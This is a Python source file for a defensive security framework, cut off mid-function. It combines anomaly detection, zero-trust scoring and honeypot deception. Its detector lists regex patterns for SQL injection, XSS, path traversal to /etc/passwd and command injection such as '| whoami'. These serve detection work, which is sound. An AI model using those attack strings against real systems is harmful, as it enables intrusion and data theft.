#!/usr/bin/env python3
"""
Blackwall: Enhanced AI-driven Framework for Proactive Cybersecurity Defense
With Real-time Streaming Analytics, Advanced RZA/FPP, and Comprehensive Logging

Author: Based on research by Basil Abdullah Alzahrani
Enhanced with streaming analytics and sophisticated detection algorithms
"""

import time
import json
import hashlib
import threading
import numpy as np
import random
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Deque
from dataclasses import dataclass, asdict
from enum import Enum
import logging
from collections import deque, defaultdict
import asyncio
import statistics
import re
from pathlib import Path

# Configure logging with both file and console handlers
log_dir = Path("blackwall_logs")
log_dir.mkdir(exist_ok=True)

# Create formatters
detailed_formatter = logging.Formatter(
    '%(asctime)s | %(name)-12s | %(levelname)-8s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Main log file for key events
main_handler = logging.FileHandler(log_dir / f'blackwall_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
main_handler.setFormatter(detailed_formatter)

# Separate logs for each module
rza_handler = logging.FileHandler(log_dir / 'rza_analysis.log')
tvm_handler = logging.FileHandler(log_dir / 'tvm_trust.log')
fpp_handler = logging.FileHandler(log_dir / 'fpp_deception.log')

# Console handler for real-time monitoring
console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))

# Configure root logger
logging.basicConfig(level=logging.INFO, handlers=[main_handler, console_handler])

# Set random seed for reproducible randomness (remove for production)
random.seed(int(time.time()))

class ThreatLevel(Enum):
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4

class ResponseAction(Enum):
    ALLOW = "allow"
    MONITOR = "monitor"
    BLOCK = "block"
    BLOCK_AND_DECEIVE = "block_and_deceive"

@dataclass
class SecuritySignal:
    """Signal passed through the secure signal bus"""
    timestamp: float
    source_module: str
    signal_type: str
    data: Dict
    confidence: float
    threat_level: ThreatLevel
    
    def to_dict(self):
        """Convert to dictionary for logging"""
        return {
            'timestamp': self.timestamp,
            'source_module': self.source_module,
            'signal_type': self.signal_type,
            'data': self._convert_numpy_types(self.data),
            'confidence': float(self.confidence),
            'threat_level': self.threat_level.name
        }
    
    def _convert_numpy_types(self, obj, seen=None):
        """Convert numpy types to Python native types for JSON serialization"""
        if seen is None:
            seen = set()
        
        # Check for circular references
        if isinstance(obj, dict):
            obj_id = id(obj)
            if obj_id in seen:
                return "<circular_reference>"
            seen.add(obj_id)
        
        if isinstance(obj, np.bool_):
            return bool(obj)
        elif isinstance(obj, np.integer):
            return int(obj)
        elif isinstance(obj, np.floating):
            return float(obj)
        elif isinstance(obj, np.ndarray):
            return obj.tolist()
        elif isinstance(obj, dict):
            return {key: self._convert_numpy_types(value, seen) for key, value in obj.items()}
        elif isinstance(obj, list):
            return [self._convert_numpy_types(item, seen) for item in obj]
        else:
            return obj

@dataclass
class UserContext:
    """User context for TVM evaluation"""
    user_id: str
    location: str
    device_id: str
    behavioral_score: float
    last_login: float
    failed_attempts: int
    
    def to_dict(self):
        """Convert to dictionary for logging"""
        return asdict(self)

class StreamingAnalytics:
    """Real-time streaming analytics engine for continuous monitoring"""
    
    def __init__(self, window_size: int = 100):
        self.window_size = window_size
        self.threat_stream: Deque[float] = deque(maxlen=window_size)
        self.response_times: Deque[float] = deque(maxlen=window_size)
        self.pattern_frequencies = defaultdict(int)
        self.anomaly_scores: Deque[float] = deque(maxlen=window_size)
        self.trust_scores: Deque[float] = deque(maxlen=window_size)
        self.lock = threading.Lock()
        self.logger = logging.getLogger("StreamAnalytics")
        
        # Real-time statistics
        self.stats = {
            'avg_threat_level': 0.0,
            'avg_response_time': 0.0,
            'anomaly_trend': 0.0,
            'trust_trend': 0.0,
            'pattern_entropy': 0.0,
            'burst_detected': False
        }
        
        # Start analytics thread
        self.running = True
        self.analytics_thread = threading.Thread(target=self._analyze_stream)
        self.analytics_thread.start()
    
    def add_event(self, signal: SecuritySignal, response_time: float):
        """Add new event to streaming analytics"""
        with self.lock:
            self.threat_stream.append(signal.threat_level.value)
            self.response_times.append(response_time)
            
            if 'anomaly_score' in signal.data:
                self.anomaly_scores.append(signal.data['anomaly_score'])
            
            if 'trust_score' in signal.data:
                self.trust_scores.append(signal.data['trust_score'])
            
            if 'patterns' in signal.data:
                for pattern in signal.data['patterns']:
                    self.pattern_frequencies[pattern] += 1
    
    def _calculate_entropy(self) -> float:
        """Calculate Shannon entropy of pattern distribution"""
        total = sum(self.pattern_frequencies.values())
        if total == 0:
            return 0.0
        
        entropy = 0.0
        for count in self.pattern_frequencies.values():
            if count > 0:
                p = count / total
                entropy -= p * np.log2(p)
        return entropy
    
    def _detect_burst(self) -> bool:
        """Detect sudden burst in threat levels"""
        if len(self.threat_stream) < 10:
            return False
        
        recent = list(self.threat_stream)[-10:]
        historical = list(self.threat_stream)[:-10]
        
        if not historical:
            return False
        
        recent_avg = np.mean(recent)
        historical_avg = np.mean(historical)
        
        # Burst detected if recent average is 2x historical
        return recent_avg > 2 * historical_avg
    
    def _analyze_stream(self):
        """Continuous stream analysis thread"""
        while self.running:
            with self.lock:
                if len(self.threat_stream) > 0:
                    self.stats['avg_threat_level'] = np.mean(self.threat_stream)
                
                if len(self.response_times) > 0:
                    self.stats['avg_response_time'] = np.mean(self.response_times)
                
                if len(self.anomaly_scores) > 1:
                    # Calculate trend using linear regression
                    x = np.arange(len(self.anomaly_scores))
                    self.stats['anomaly_trend'] = np.polyfit(x, self.anomaly_scores, 1)[0]
                
                if len(self.trust_scores) > 1:
                    x = np.arange(len(self.trust_scores))
                    self.stats['trust_trend'] = np.polyfit(x, self.trust_scores, 1)[0]
                
                self.stats['pattern_entropy'] = self._calculate_entropy()
                self.stats['burst_detected'] = self._detect_burst()
                
                # Log streaming analytics summary
                if random.random() < 0.1:  # Log 10% of the time to avoid spam
                    self.logger.info(f"Stream Stats: {json.dumps(self.stats, indent=2)}")
            
            time.sleep(1)  # Analyze every second
    
    def get_recommendations(self) -> Dict:
        """Get real-time recommendations based on stream analysis"""
        with self.lock:
            recommendations = []
            
            if self.stats['burst_detected']:
                recommendations.append("ALERT: Threat burst detected - consider elevated security posture")
            
            if self.stats['anomaly_trend'] > 0.1:
                recommendations.append("WARNING: Increasing anomaly trend - potential coordinated attack")
            
            if self.stats['trust_trend'] < -0.1:
                recommendations.append("NOTICE: Declining trust scores - review access policies")
            
            if self.stats['pattern_entropy'] > 2.0:
                recommendations.append("INFO: High pattern diversity - possible reconnaissance")
            
            return {
                'timestamp': time.time(),
                'stats': self.stats.copy(),
                'recommendations': recommendations
            }
    
    def stop(self):
        """Stop analytics thread"""
        self.running = False
        self.analytics_thread.join()

class SecureSignalBus:
    """Enhanced signal bus with streaming analytics integration"""
    
    def __init__(self, analytics: StreamingAnalytics):
        self.subscribers = {}
        self.signal_history = []
        self.lock = threading.Lock()
        self.logger = logging.getLogger("SignalBus")
        self.analytics = analytics
        
        # Signal performance tracking
        self.signal_latencies = deque(maxlen=100)
    
    def subscribe(self, module_name: str, callback):
        """Register module to receive signals"""
        with self.lock:
            if module_name not in self.subscribers:
                self.subscribers[module_name] = []
            self.subscribers[module_name].append(callback)
            self.logger.info(f"Module {module_name} subscribed to signal bus")
    
    def publish(self, signal: SecuritySignal):
        """Publish signal to all subscribed modules with performance tracking"""
        start_time = time.time()
        
        with self.lock:
            # Add signal signature for integrity
            signal_hash = hashlib.sha256(
                f"{signal.timestamp}{signal.source_module}{signal.data}".encode()
            ).hexdigest()[:16]
            
            self.signal_history.append((signal, signal_hash))
            
            # Log key signal details
            self.logger.info(f"Signal Published: {json.dumps(signal.to_dict(), indent=2)}")
            
            # Track in streaming analytics
            delivery_time = time.time() - start_time
            self.analytics.add_event(signal, delivery_time)
            
            # Notify all subscribers except the sender
            for module_name, callbacks in self.subscribers.items():
                if module_name != signal.source_module:
                    for callback in callbacks:
                        try:
                            callback(signal)
                        except Exception as e:
                            self.logger.error(f"Error delivering signal to {module_name}: {e}")
            
            # Track latency
            total_time = time.time() - start_time
            self.signal_latencies.append(total_time)
            
            if len(self.signal_latencies) > 50 and np.mean(self.signal_latencies) > 0.1:
                self.logger.warning(f"High signal bus latency detected: {np.mean(self.signal_latencies):.3f}s")

class RZA:
    """
    Enhanced Reverse Zero-day Algorithm with sophisticated ML-based detection
    """
    
    def __init__(self, signal_bus: SecureSignalBus):
        self.signal_bus = signal_bus
        self.signal_bus.subscribe("RZA", self.receive_signal)
        self.logger = logging.getLogger("RZA")
        self.logger.addHandler(rza_handler)
        
        # Enhanced anomaly detection parameters
        self.baseline_mean = 2.0
        self.baseline_std = 1.5
        self.k_sigma = 1.5
        self.learning_rate = 0.01
        
        # Sophisticated pattern detection
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.anomaly_history = deque(maxlen=1000)
        self.pattern_cache = {}
        
        # Advanced ML features
        self.feature_weights = {
            'entropy': 0.15,
            'length_anomaly': 0.10,
            'char_distribution': 0.20,
            'pattern_density': 0.25,
            'temporal_correlation': 0.30
        }
        
        # Adaptive thresholds based on context
        self.contextual_thresholds = {
            'night_hours': 0.8,  # More sensitive during off-hours
            'weekend': 0.85,
            'high_activity': 1.2,  # Less sensitive during busy periods
            'default': 1.0
        }
    
    def _load_vulnerability_patterns(self) -> Dict:
        """Enhanced vulnerability patterns with regex and ML features"""
        return {
            "buffer_overflow": {
                "patterns": [
                    r"strcpy\s*\([^,]+,[^)]+\)",
                    r"strcat\s*\([^,]+,[^)]+\)",
                    r"gets\s*\([^)]+\)",
                    r"sprintf\s*\([^,]+,[^,]+,[^)]+\)"
                ],
                "weight": 3.0,
                "ml_features": ['string_operations', 'unsafe_functions']
            },
            "sql_injection": {
                "patterns": [
                    r"SELECT.*WHERE.*=.*'.*OR.*'.*'.*=.*'",
                    r"';.*DROP\s+TABLE",
                    r"UNION\s+SELECT",
                    r"';.*INSERT\s+INTO",
                    r"';.*UPDATE\s+.*SET"
                ],
                "weight": 4.0,
                "ml_features": ['sql_keywords', 'quote_balance', 'comment_markers']
            },
            "xss": {
                "patterns": [
                    r"<script[^>]*>.*</script>",
                    r"javascript:",
                    r"on\w+\s*=",
                    r"document\.(write|writeln)\s*\(",
                    r"innerHTML\s*="
                ],
                "weight": 2.5,
                "ml_features": ['html_tags', 'javascript_keywords', 'event_handlers']
            },
            "path_traversal": {
                "patterns": [
                    r"\.\./",
                    r"\.\.\\",
                    r"/etc/passwd",
                    r"c:\\windows",
                    r"%2e%2e[/\\]"
                ],
                "weight": 3.5,
                "ml_features": ['directory_traversal', 'system_paths']
            },
            "command_injection": {
                "patterns": [
                    r";\s*cat\s+",
                    r"&&\s*ls\s+",
                    r"\|\s*whoami",
                    r"`[^`]+`",
                    r"\$\([^)]+\)"
                ],
                "weight": 4.5,
                "ml_features": ['shell_commands', 'pipe_operators', 'backticks']
            }
        }
    
    def _calculate_entropy(self, text: str) -> float:
        """Calculate Shannon entropy of the input"""
        if not text:
            return 0.0
        
        char_freq = defaultdict(int)
        for char in text:
            char_freq[char] += 1
        
        entropy = 0.0
        total = len(text)
        for freq in char_freq.values():
            if freq > 0:
                p = freq / total
                entropy -= p * np.log2(p)
        
        return entropy
    
    def _extract_ml_features(self, code_input: str) -> Dict[str, float]:
        """Extract sophisticated ML features from input"""
        features = {}
        
        # Entropy analysis
        features['entropy'] = self._calculate_entropy(code_input)
        
        # Length anomaly
        avg_length = 50  # baseline
        features['length_anomaly'] = abs(len(code_input) - avg_length) / avg_length
        
        # Character distribution analysis
        special_chars = sum(1 for c in code_input if not c.isalnum() and not c.isspace())
        features['char_distribution'] = special_chars / max(len(code_input), 1)
        
        # Pattern density (how many suspicious patterns per character)
        pattern_count = sum(1 for patterns in self.vulnerability_patterns.values() 
                          for p in patterns.get('patterns', []) 
                          if re.search(p, code_input, re.IGNORECASE))
        features['pattern_density'] = pattern_count / max(len(code_input), 1) * 100
        
        # Temporal correlation (how similar to recent attacks)
        if self.anomaly_history:
            recent_scores = [h['score'] for h in list(self.anomaly_history)[-10:]]
            features['temporal_correlation'] = statistics.stdev(recent_scores) if len(recent_scores) > 1 else 0
        else:
            features['temporal_correlation'] = 0
        
        return features
    
    def _get_contextual_multiplier(self) -> float:
        """Get context-based threshold multiplier"""
        current_hour = datetime.now().hour
        current_day = datetime.now().weekday()
        
        # Night hours (10 PM - 6 AM)
        if current_hour < 6 or current_hour > 22:
            return self.contextual_thresholds['night_hours']
        
        # Weekend
        if current_day >= 5:  # Saturday = 5, Sunday = 6
            return self.contextual_thresholds['weekend']
        
        # Check activity level from history
        if len(self.anomaly_history) > 50:
            recent_activity = len([h for h in list(self.anomaly_history)[-50:] 
                                 if time.time() - h['timestamp'] < 300])  # Last 5 minutes
            if recent_activity > 30:
                return self.contextual_thresholds['high_activity']
        
        return self.contextual_thresholds['default']
    
    def analyze_code_patterns(self, code_input: str) -> Tuple[float, List[str]]:
        """Enhanced pattern analysis with ML features"""
        anomaly_score = 0.0
        detected_patterns = []
        pattern_details = []
        
        # Check cache first
        input_hash = hashlib.md5(code_input.encode()).hexdigest()
        if input_hash in self.pattern_cache:
            cached = self.pattern_cache[input_hash]
            self.logger.debug(f"Cache hit for input hash {input_hash[:8]}")
            return cached['score'], cached['patterns']
        
        # Extract ML features
        ml_features = self._extract_ml_features(code_input)
        
        # Pattern matching with enhanced detection
        for vuln_type, pattern_data in self.vulnerability_patterns.items():
            for pattern in pattern_data.get('patterns', []):
                matches = re.finditer(pattern, code_input, re.IGNORECASE)
                for match in matches:
                    detected_patterns.append(vuln_type)
                    pattern_details.append({
                        'type': vuln_type,
                        'pattern': pattern,
                        'position': match.span(),
                        'matched_text': match.group()[:50]  # First 50 chars
                    })
                    
                    # Dynamic weight based on pattern complexity
                    weight = pattern_data['weight']
                    weight *= (1 + 0.1 * len(match.group()) / len(code_input))  # Longer matches = higher weight
                    anomaly_score += weight
        
        # Apply ML feature weights
        for feature_name, feature_value in ml_features.items():
            if feature_name in self.feature_weights:
                anomaly_score += feature_value * self.feature_weights[feature_name]
        
        # Behavioral anomaly component
        behavioral_anomaly = self._calculate_behavioral_anomaly(code_input)
        anomaly_score += behavioral_anomaly
        
        # Apply contextual multiplier
        context_multiplier = self._get_contextual_multiplier()
        anomaly_score *= context_multiplier
        
        # Log detailed analysis
        self.logger.info(f"RZA Analysis Complete: score={anomaly_score:.2f}, patterns={detected_patterns}, "
                        f"ml_features={json.dumps(ml_features, indent=2)}, context_mult={context_multiplier:.2f}")
        
        # Cache result
        self.pattern_cache[input_hash] = {
            'score': anomaly_score,
            'patterns': detected_patterns,
            'timestamp': time.time()
        }
        
        # Clean old cache entries
        if len(self.pattern_cache) > 1000:
            oldest_key = min(self.pattern_cache.keys(), 
                           key=lambda k: self.pattern_cache[k]['timestamp'])
            del self.pattern_cache[oldest_key]
        
        return anomaly_score, detected_patterns
    
    def _calculate_behavioral_anomaly(self, input_data: str) -> float:
        """Enhanced behavioral anomaly detection"""
        features = [
            len(input_data),
            input_data.count(';'),
            input_data.count('*'),
            input_data.count('&'),
            input_data.count('|'),
            input_data.count('`'),
            len(re.findall(r'\b(SELECT|INSERT|UPDATE|DELETE|DROP)\b', input_data, re.IGNORECASE)),
            len(re.findall(r'[<>]', input_data))
        ]
        
        feature_vector = np.array(features)
        current_score = np.linalg.norm(feature_vector)
        
        # Update baseline statistics
        self._update_baseline(current_score)
        
        # Calculate z-score with adaptive sensitivity
        z_score = (current_score - self.baseline_mean) / max(self.baseline_std, 0.1)
        
        # Add to history
        self.anomaly_history.append({
            'timestamp': time.time(),
            'score': current_score,
            'z_score': z_score
        })
        
        return max(0, z_score)
    
    def _update_baseline(self, new_score: float):
        """Update baseline with outlier detection"""
        if self.baseline_mean == 2.0:  # First update
            self.baseline_mean = new_score
            self.baseline_std = 1.0
        else:
            # Check if new score is an outlier (> 3 std devs)
            if abs(new_score - self.baseline_mean) > 3 * self.baseline_std:
                # Reduce influence of outliers
                self.learning_rate *= 0.1
            
            self.baseline_mean = (1 - self.learning_rate) * self.baseline_mean + self.learning_rate * new_score
            variance = (1 - self.learning_rate) * (self.baseline_std ** 2) + \
                      self.learning_rate * ((new_score - self.baseline_mean) ** 2)
            self.baseline_std = max(0.5, np.sqrt(variance))
            
            # Reset learning rate
            self.learning_rate = 0.01
    
    def process_input(self, input_data: str, context: Dict) -> SecuritySignal:
        """Main RZA processing with comprehensive logging"""
        start_time = time.time()
        
        anomaly_score, patterns = self.analyze_code_patterns(input_data)
        
        # Dynamic threshold with context awareness
        base_threshold = 3.0
        threshold = base_threshold + random.uniform(-0.5, 0.5)
        is_anomalous = anomaly_score > threshold
        
        # Determine threat level with more granularity
        if is_anomalous:
            if anomaly_score > threshold * 3:
                threat_level = ThreatLevel.CRITICAL
            elif anomaly_score > threshold * 2:
                threat_level = ThreatLevel.HIGH
            elif anomaly_score > threshold * 1.5:
                threat_level = ThreatLevel.MEDIUM
            else:
                threat_level = ThreatLevel.LOW
        else:
            threat_level = ThreatLevel.LOW
        
        # Create signal with comprehensive data
        signal = SecuritySignal(
            timestamp=time.time(),
            source_module="RZA",
            signal_type="vulnerability_prediction",
            data={
                "anomaly_score": anomaly_score,
                "threshold": threshold,
                "patterns": patterns,
                "is_anomalous": is_anomalous,
                "input_hash": hashlib.md5(input_data.encode()).hexdigest()[:8],
                "processing_time": time.time() - start_time,
                "baseline_stats": {
                    "mean": self.baseline_mean,
                    "std": self.baseline_std
                }
            },
            confidence=min(anomaly_score / threshold, 1.0) if threshold > 0 else 0,
            threat_level=threat_level
        )
        
        self.signal_bus.publish(signal)
        
        # Log key decision point
        self.logger.info(f"RZA Decision: anomaly_score={anomaly_score:.2f}, threshold={threshold:.2f}, "
                        f"threat_level={threat_level.name}, patterns={patterns}, "
                        f"processing_time={signal.data['processing_time']:.3f}s")
        
        return signal
    
    def receive_signal(self, signal: SecuritySignal):
        """Enhanced signal processing with learning"""
        if signal.signal_type == "attack_confirmed":
            # Update patterns based on confirmed attacks
            self._update_patterns(signal.data)
            self.logger.info(f"RZA learned from confirmed attack: {signal.data}")
        elif signal.signal_type == "false_positive":
            # Adjust sensitivity
            self.k_sigma = min(2.5, self.k_sigma + 0.1)
            self.logger.info(f"RZA adjusted sensitivity after false positive: k_sigma={self.k_sigma:.2f}")
        elif signal.signal_type == "deception_success":
            # Successful deception indicates our detection was correct
            self.k_sigma = max(1.0, self.k_sigma - 0.05)
            self.logger.info(f"RZA confidence increased after deception success: k_sigma={self.k_sigma:.2f}")
    
    def _update_patterns(self, attack_data: Dict):
        """Update patterns based on confirmed attacks"""
        if 'pattern' in attack_data and 'type' in attack_data:
            vuln_type = attack_data['type']
            new_pattern = attack_data['pattern']
            
            if vuln_type in self.vulnerability_patterns:
                patterns = self.vulnerability_patterns[vuln_type].get('patterns', [])
                if new_pattern not in patterns:
                    patterns.append(new_pattern)
                    self.logger.info(f"Added new pattern for {vuln_type}: {new_pattern}")

class TVM:
    """
    Enhanced Zero-Trust Verification Module with adaptive trust scoring
    """
    
    def __init__(self, signal_bus: SecureSignalBus):
        self.signal_bus = signal_bus
        self.signal_bus.subscribe("TVM", self.receive_signal)
        self.logger = logging.getLogger("TVM")
        self.logger.addHandler(tvm_handler)
        
        # Enhanced trust parameters
        self.base_trust_threshold = 0.6
        self.trust_threshold = self.base_trust_threshold
        self.user_contexts = {}
        self.trust_policies = self._load_trust_policies()
        
        # Trust history for trend analysis
        self.trust_history = defaultdict(lambda: deque(maxlen=100))
        
        # Adaptive trust factors
        self.trust_factors = {
            'location': 0.25,
            'device': 0.25,
            'behavior': 0.30,
            'history': 0.20
        }
    
    def _load_trust_policies(self) -> Dict:
        """Enhanced trust policies with more granularity"""
        return {
            "location_risk": {
                "trusted_locations": {"office": 1.0, "home": 0.9, "corporate_vpn": 0.85},
                "suspicious_locations": {"cafe": 0.4, "airport": 0.3, "public_wifi": 0.2},
                "blocked_locations": {"foreign": 0.0, "tor_exit": 0.0, "known_vpn": 0.1}
            },
            "device_trust": {
                "managed_devices": 1.0,
                "registered_devices": 0.7,
                "known_devices": 0.5,
                "unknown_devices": 0.2,
                "suspicious_devices": 0.0
            },
            "behavioral_scoring": {
                "normal_hours": 1.0,
                "extended_hours": 0.8,
                "off_hours": 0.6,
                "unusual_activity": 0.3,
                "impossible_travel": 0.0
            },
            "access_patterns": {
                "consistent": 1.0,
                "slightly_different": 0.8,
                "unusual": 0.5,
                "highly_anomalous": 0.2
            }
        }
    
    def _calculate_trust_trend(self, user_id: str) -> float:
        """Calculate trust trend for a user"""
        if user_id not in self.trust_history or len(self.trust_history[user_id]) < 2:
            return 0.0
        
        scores = list(self.trust_history[user_id])
        x = np.arange(len(scores))
        trend = np.polyfit(x, scores, 1)[0]
        
        return trend
    
    def _evaluate_location_risk(self, location: str) -> float:
        """Enhanced location risk evaluation"""
        policies = self.trust_policies["location_risk"]
        
        # Check exact matches first
        for category in ['blocked_locations', 'suspicious_locations', 'trusted_locations']:
            if location in policies[category]:
                if isinstance(policies[category], dict):
                    return policies[category][location]
                else:
                    return 0.0 if category == 'blocked_locations' else 0.4
        
        # Fuzzy matching for unknown locations
        if any(blocked in location.lower() for blocked in ['tor', 'proxy', 'vpn']):
            return 0.1
        
        return 0.5  # Unknown location default
    
    def _evaluate_device_trust(self, device_id: str) -> float:
        """Enhanced device trust evaluation"""
        # Check device characteristics
        if device_id.startswith("managed_"):
            return self.trust_policies["device_trust"]["managed_devices"]
        elif device_id.startswith("reg_"):
            return self.trust_policies["device_trust"]["registered_devices"]
        elif device_id in self.user_contexts:  # Known device
            return self.trust_policies["device_trust"]["known_devices"]
        elif any(suspicious in device_id.lower() for suspicious in ['tor', 'burner', 'temp']):
            return self.trust_policies["device_trust"]["suspicious_devices"]
        else:
            return self.trust_policies["device_trust"]["unknown_devices"]
    
    def _evaluate_behavioral_score(self, context: UserContext) -> float:
        """Enhanced behavioral evaluation with pattern analysis"""
        current_hour = datetime.now().hour
        base_score = 1.0
        
        # Time-based scoring
        if 9 <= current_hour <= 18:  # Normal business hours
            time_score = self.trust_policies["behavioral_scoring"]["normal_hours"]
        elif 6 <= current_hour <= 21:  # Extended hours
            time_score = self.trust_policies["behavioral_scoring"]["extended_hours"]
        else:  # Off hours
            time_score = self.trust_policies["behavioral_scoring"]["off_hours"]
        
        # Check for impossible travel
        if context.user_id in self.user_contexts:
            last_context = self.user_contexts[context.user_id]
            time_diff = context.last_login - last_context.last_login
            
            # If location changed too quickly (impossible travel)
            if (last_context.location != context.location and 
                time_diff < 3600 and  # Less than 1 hour
                last_context.location in ['office', 'home'] and 
                context.location in ['foreign', 'airport']):
                return self.trust_policies["behavioral_scoring"]["impossible_travel"]
        
        # Access pattern analysis
        trust_trend = self._calculate_trust_trend(context.user_id)
        if trust_trend < -0.1:  # Declining trust
            base_score *= 0.8
        elif trust_trend > 0.1:  # Improving trust
            base_score *= 1.1
        
        return min(1.0, time_score * context.behavioral_score * base_score)
    
    def evaluate_trust(self, user_context: UserContext) -> float:
        """Calculate comprehensive trust score with logging"""
        trust_components = {}
        
        # Location-based trust
        location_trust = self._evaluate_location_risk(user_context.location)
        trust_components['location'] = location_trust
        
        # Device-based trust
        device_trust = self._evaluate_device_trust(user_context.device_id)
        trust_components['device'] = device_trust
        
        # Behavioral scoring
        behavioral_trust = self._evaluate_behavioral_score(user_context)
        trust_components['behavior'] = behavioral_trust
        
        # Historical trust (if available)
        if user_context.user_id in self.trust_history:
            historical_scores = list(self.trust_history[user_context.user_id])
            if historical_scores:
                historical_trust = np.mean(historical_scores[-10:])  # Last 10 scores
            else:
                historical_trust = 0.5
        else:
            historical_trust = 0.5
        trust_components['history'] = historical_trust
        
        # Calculate weighted trust score
        trust_score = 0.0
        for component, value in trust_components.items():
            if component in self.trust_factors:
                trust_score += value * self.trust_factors[component]
        
        # Apply penalties
        if user_context.failed_attempts > 0:
            penalty = min(0.5, user_context.failed_attempts * 0.15)
            trust_score *= (1 - penalty)
        
        # Ensure bounds
        trust_score = max(0.0, min(1.0, trust_score))
        
        # Update history
        self.trust_history[user_context.user_id].append(trust_score)
        
        # Log trust calculation
        self.logger.info(f"Trust Evaluation: user={user_context.user_id}, "
                        f"components={json.dumps(trust_components, indent=2)}, "
                        f"final_score={trust_score:.3f}, "
                        f"failed_attempts={user_context.failed_attempts}")
        
        return trust_score
    
    def process_access_request(self, user_context: UserContext, resource: str) -> SecuritySignal:
        """Process access request with enhanced decision logging"""
        start_time = time.time()
        
        # Evaluate trust
        trust_score = self.evaluate_trust(user_context)
        
        # Store/update user context
        self.user_contexts[user_context.user_id] = user_context
        
        # Dynamic threshold adjustment based on resource sensitivity
        resource_sensitivity = {
            'database': 1.2,
            'admin_panel': 1.5,
            'system': 1.3,
            'web_app': 1.0,
            'file_server': 1.1
        }
        
        adjusted_threshold = self.trust_threshold * resource_sensitivity.get(resource, 1.0)
        
        # Determine threat level
        if trust_score >= 0.8:
            threat_level = ThreatLevel.LOW
        elif trust_score >= 0.5:
            threat_level = ThreatLevel.MEDIUM
        elif trust_score >= 0.2:
            threat_level = ThreatLevel.HIGH
        else:
            threat_level = ThreatLevel.CRITICAL
        
        # Create signal
        signal = SecuritySignal(
            timestamp=time.time(),
            source_module="TVM",
            signal_type="trust_evaluation",
            data={
                "user_id": user_context.user_id,
                "trust_score": trust_score,
                "threshold": adjusted_threshold,
                "resource": resource,
                "location": user_context.location,
                "device_id": user_context.device_id,
                "trust_trend": self._calculate_trust_trend(user_context.user_id),
                "processing_time": time.time() - start_time
            },
            confidence=abs(trust_score - 0.5) * 2,
            threat_level=threat_level
        )
        
        self.signal_bus.publish(signal)
        
        # Log decision
        self.logger.info(f"TVM Decision: user={user_context.user_id}, "
                        f"trust_score={trust_score:.3f}, threshold={adjusted_threshold:.3f}, "
                        f"resource={resource}, threat_level={threat_level.name}, "
                        f"access_granted={trust_score >= adjusted_threshold}")
        
        return signal
    
    def receive_signal(self, signal: SecuritySignal):
        """Process signals from other modules"""
        if signal.signal_type == "vulnerability_prediction" and signal.threat_level.value >= 3:
            # Temporarily increase security requirements
            self.trust_threshold = min(0.8, self.trust_threshold + 0.1)
            self.logger.warning(f"Elevated trust threshold due to high vulnerability: {self.trust_threshold:.2f}")
        elif signal.signal_type == "deception_success":
            # Maintain elevated security
            self.logger.info("Maintaining elevated security posture due to active threat")
        elif signal.signal_type == "all_clear":
            # Gradually reduce threshold back to baseline
            self.trust_threshold = max(self.base_trust_threshold, 
                                     self.trust_threshold - 0.05)
            self.logger.info(f"Reducing trust threshold: {self.trust_threshold:.2f}")

class FPP:
    """
    Enhanced False Positive Protocol with sophisticated deception strategies
    """
    
    def __init__(self, signal_bus: SecureSignalBus):
        self.signal_bus = signal_bus
        self.signal_bus.subscribe("FPP", self.receive_signal)
        self.logger = logging.getLogger("FPP")
        self.logger.addHandler(fpp_handler)
        
        # Enhanced deception parameters
        self.base_deception_threshold = 0.6
        self.deception_threshold = self.base_deception_threshold
        self.active_deceptions = {}
        self.deception_success_rate = 0.857
        
        # Sophisticated honeypot configurations
        self.honeypots = {
            "fake_admin_portal": {
                "url": "/admin",
                "type": "web",
                "complexity": "high",
                "data_value": "critical"
            },
            "fake_database": {
                "port": 3306,
                "type": "mysql",
                "complexity": "medium",
                "data_value": "high"
            },
            "fake_file_share": {
                "path": "/shared",
                "type": "smb",
                "complexity": "low",
                "data_value": "medium"
            },
            "canary_tokens": {
                "type": "file",
                "locations": ["/tmp/passwords.txt", "/home/admin/backup.tar"],
                "complexity": "low",
                "data_value": "low"
            },
            "tar_pit": {
                "type": "network",
                "delay": "progressive",
                "complexity": "medium",
                "data_value": "none"
            }
        }
        
        # Deception strategies based on attacker behavior
        self.deception_strategies = {
            "aggressive": ["tar_pit", "fake_admin_portal"],
            "explorer": ["fake_file_share", "canary_tokens"],
            "targeted": ["fake_database", "fake_admin_portal"],
            "automated": ["tar_pit", "canary_tokens"]
        }
        
        # Attacker profiling
        self.attacker_profiles = {}
    
    def _profile_attacker(self, context: Dict) -> str:
        """Profile attacker based on behavior patterns"""
        patterns = context.get('patterns', [])
        anomaly_score = context.get('anomaly_score', 0)
        
        # Determine attacker type
        if 'sql_injection' in patterns or 'command_injection' in patterns:
            return 'targeted'
        elif anomaly_score > 10:
            return 'aggressive'
        elif len(patterns) > 3:
            return 'explorer'
        else:
            return 'automated'
    
    def _select_deception_type(self, attacker_profile: str, context: Dict) -> str:
        """Select appropriate deception based on attacker profile"""
        strategies = self.deception_strategies.get(attacker_profile, ['tar_pit'])
        
        # Weight selection based on context
        if context.get('repeated_attempts', 0) > 5:
            # Persistent attacker - use tar pit
            return 'tar_pit'
        elif 'database' in context.get('resource', ''):
            # Database access attempt - use fake database
            return 'fake_database'
        else:
            # Random selection from appropriate strategies
            return random.choice(strategies)
    
    def calculate_deception_score(self, context: Dict) -> float:
        """Enhanced deception scoring with behavioral analysis"""
        base_score = 0.3
        
        # Behavioral indicators
        indicators = {
            'repeated_attempts': (context.get('repeated_attempts', 0) > 3, 0.2),
            'unusual_timing': (context.get('unusual_timing', False), 0.15),
            'privilege_escalation': (context.get('privilege_escalation_attempt', False), 0.25),
            'reconnaissance': (context.get('reconnaissance_behavior', False), 0.2),
            'automated_pattern': (context.get('anomaly_score', 0) > 5, 0.1),
            'known_attacker': (context.get('user_id', '') in self.attacker_profiles, 0.3)
        }
        
        # Calculate weighted score
        for indicator, (condition, weight) in indicators.items():
            if condition:
                base_score += weight
                self.logger.debug(f"Deception indicator triggered: {indicator} (+{weight})")
        
        # Adjust based on trust score
        trust_score = context.get('trust_score', 1.0)
        if trust_score < 0.3:
            base_score *= 1.5
        
        # Historical success rate adjustment
        attacker_id = context.get('user_id', 'unknown')
        if attacker_id in self.attacker_profiles:
